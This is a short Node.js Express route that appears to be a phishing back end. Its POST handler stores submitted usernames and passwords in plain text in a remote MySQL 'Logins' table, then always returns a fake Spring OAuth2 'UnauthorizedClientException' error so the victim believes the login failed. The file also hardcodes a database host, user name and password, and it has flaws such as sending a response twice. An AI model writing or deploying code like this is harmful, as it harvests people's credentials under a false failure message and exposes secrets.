var express = require('express');
var router = express.Router();
const mysql = require("mysql");

const connection = mysql.createConnection({
    host: "http://35.242.199.208",
    user: "lethiux",
    database: "girder:europe-west3:girder",
    password : 'Lethiux86()'
});

router.post('/', function(req, res) {
    const username = req.body.username;
    const password = req.body.password;
    const timestamp = new Date();
    const data = {
        usenme: username,
        pswed: password,
        timestamp: timestamp
    };
    var error = {
        result: {},
        errors: ['java.lang.Object\n' +
        'java.lang.Throwable\n' +
        'java.lang.Exception\n' +
        'java.lang.RuntimeException\n' +
        'org.springframework.security.oauth2.common.exceptions.OAuth2Exception\n' +
        'org.springframework.security.oauth2.common.exceptions.ClientAuthenticationException\n' +
        'org.springframework.security.oauth2.common.exceptions.UnauthorizedClientException']
    };

    connection.query('INSERT INTO Logins SET ?', data, function (error, results, fields) {
        console.log('ERROR:');
        console.log(error + '\n\n');

        if (error) throw error;

        console.log('Entry saved');
        res.send(error);
    });

    res.send(error);
});

module.exports = router;